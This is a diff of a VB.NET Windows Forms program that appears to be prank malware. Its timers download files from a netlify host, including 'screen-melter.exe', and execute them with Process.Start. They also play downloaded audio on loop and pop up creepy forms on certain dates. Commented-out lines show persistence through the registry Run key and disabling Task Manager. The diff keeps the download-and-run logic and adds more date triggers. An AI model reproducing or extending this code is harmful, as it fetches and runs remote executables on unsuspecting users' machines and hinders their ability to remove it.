@@ -82,7 +82,11 @@ Public Class Form1
                     hahahahaerror.Show()
                 End If
                 If month = 8 Then
+                    '   creepy_Patrick_Star.Show()
                     Timer3.Start()
+                End If
+                If day = 12 AndAlso month = 2 Then
+                    Form2.Show()
                 End If
                 If month = 9 Then
 
@@ -97,6 +101,12 @@ Public Class Form1
 
                 If day = 1 AndAlso month = 12 Then
                     My.Settings.working = False
+                    Try
+                        My.Computer.FileSystem.DeleteFile("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki")
+                    Catch ex As Exception
+                        MsgBox(ex.ToString, 0 + 16, "error")
+                    End Try
+
                     '  My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
                     ' RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD")
                     Yuki_credits.Show()
@@ -133,10 +143,10 @@ Public Class Form1
         Try
             Using client = New WebClient()
 
-                Using stream = client.OpenRead("http://www.google.com")
+                '  Using stream = client.OpenRead("http://www.google.com") server overloaded
 
-                End Using
-                Try
+            End Using
+            Try
                     My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/346tr8Ge6.wav",
            "C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav")
@@ -146,8 +156,8 @@ Public Class Form1
 
                 My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav", AudioPlayMode.BackgroundLoop)
                 Timer1.Stop()
-            End Using
-        Catch
+            'End Using
+        Catch ex As Exception
 
         End Try
     End Sub
@@ -155,9 +165,9 @@ Public Class Form1
     Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
         Try
             Using client = New WebClient()
-                Using stream = client.OpenRead("http://www.google.com")
+                '  Using stream = client.OpenRead("http://www.google.com")
 
-                End Using
+            End Using
                 Try
                     My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/screen-melter.exe",
@@ -169,7 +179,7 @@ Public Class Form1
 
                 Process.Start("C:\Users\" & SystemInformation.UserName & "\screen-melter.exe")
                 Timer2.Stop()
-            End Using
+            ' End Using
         Catch
 
         End Try
@@ -178,21 +188,21 @@ Public Class Form1
     Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
         Try
             Using client = New WebClient()
-                Using stream = client.OpenRead("http://www.google.com")
+                '   Using stream = client.OpenRead("http://www.google.com")
 
-                End Using
+            End Using
                 Try
-                    My.Computer.Network.DownloadFile(
-            "https://incomparable-cascaron-802b94.netlify.app/whatthefuckimout1.wav",
-           "C:\Users\" & SystemInformation.UserName & "\whatthefuckimout1.wav")
-                Catch ex As Exception
+                My.Computer.Network.DownloadFile(
+            "https://incomparable-cascaron-802b94.netlify.app/whatthefuckimout.wav",
+           "C:\Users\" & SystemInformation.UserName & "\whatthefuckimout.wav")
+            Catch ex As Exception
 
                 End Try
                 creepy_Patrick_Star.Show()
 
-                My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\whatthefuckimout1.wav", AudioPlayMode.BackgroundLoop)
-                Timer2.Stop()
-            End Using
+            My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\whatthefuckimout.wav", AudioPlayMode.BackgroundLoop)
+            Timer2.Stop()
+            ' End Using
         Catch
 
         End Try
